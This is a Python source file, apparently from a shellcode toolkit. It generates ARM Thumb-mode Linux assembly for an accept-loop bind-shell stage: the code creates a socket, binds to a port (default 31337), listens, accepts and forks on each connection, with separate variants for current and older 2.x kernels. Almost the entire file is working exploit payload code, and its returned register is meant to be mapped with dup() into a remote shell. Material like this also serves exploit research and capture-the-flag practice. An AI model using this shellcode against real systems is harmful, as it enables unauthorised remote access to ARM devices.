import socket

def generate(port=31337, version=3):
    """accept loop shellcode in Thumb Mode
    
    Args:
        port(int/str): specific port

        version(int): 2 is old linux kernel including 2.x (default: 3)

    Returns:
        ``r6`` reg indicates socket descriptor will be mapped with dup()
    """

    sc = ''

    if int(version) == 3:
        sc = '''
        /* socket(...) */
        movs r0, #2
        movs r1, #1
        subs r2, r2, r2
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #26
        svc 1

        /* bind(...) */
        mov r6, r0
        mov r4, pc
        adds r4, #22
        ldr r1, [r4]
        subs r2, r2, r2
        push { r1, r2 }
        mov r0, r6
        mov r1, sp
        movs r2, #16
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #27
        svc 1

        b after_sockaddr_in_5

    sockaddr_in_1:
        .short 2
        .short %s

        /* listen(...) */
    after_sockaddr_in_5:
        movs r1, #16
        mov r0, r6
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #29
        svc 1

        /* accept(...) */
    looplabel_2:
        mov r0, r6
        subs r1, r1, r1
        subs r2, r2, r2
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #30
        svc 1 ''' % (socket.ntohs(port))

    elif int(version) == 2:
        # for old linux kernel
        sc = '''
	/* socketcall( socket, { 2, 1, 6 } ) */
        movs r1, #2
        movs r2, #1
        movs r3, #6
        push {r1-r3}
        movs r0, #1
        mov  r1, sp
        movs r7, #102
        svc 1

        /* backup socket descriptor r6 bind(...) */
        mov  r6, r0

        /* socketcall( bind, { struct sockaddr_in })*/
        mov  r4, pc
        adds r4, #24
        ldr  r1, [r4]
        subs r2, r2, r2
        push { r1, r2 }

        mov  r0, r6
        mov  r1, sp
        movs r2, #16
        push { r0-r2 }
        /* BIND */
        movs r0, #2
        mov  r1, sp
        movs r7, #102
        svc 1
        
        b listen_func

        /* AF_INET */
        .short 2 
        /* PORT    */
        .short %s

    listen_func:
        /* socketcall( listen, { fd, backlog } ) */
        movs  r1, #16
        mov   r0, r6
        push { r0, r1 }
        /* LISTEN */
        movs r0, #4
        mov  r1, sp
        movs r7, #102
        svc 1

    looplabel_2:
        /* socketcall( accept, { fd, 0, 0 } ) */
        mov   r0, r6
        subs  r1, r1, r1
        subs  r2, r2, r2
        push { r0-r2 }
        /* ACCEPT */
        movs r0, #5
        mov  r1, sp
        movs r7, #102
        svc 1

        ''' % (socket.ntohs(port))
    else:
        print "Not implemented yet"
        return None

    sc += '''
    /* fork(...) */
    mov r5, r0
    movs r7, #2
    svc 1
    cmp r0, #0
    bgt cleanup_3

    /* child close(...) */
    mov r0, r6
    movs r7, #6
    svc 1

    mov r0, r5
    b after_fork_4

    /* parent close() */
cleanup_3:
    mov r0, r5
    movs r7, #6
    svc 1

    b looplabel_2

after_fork_4:
    '''
    return sc
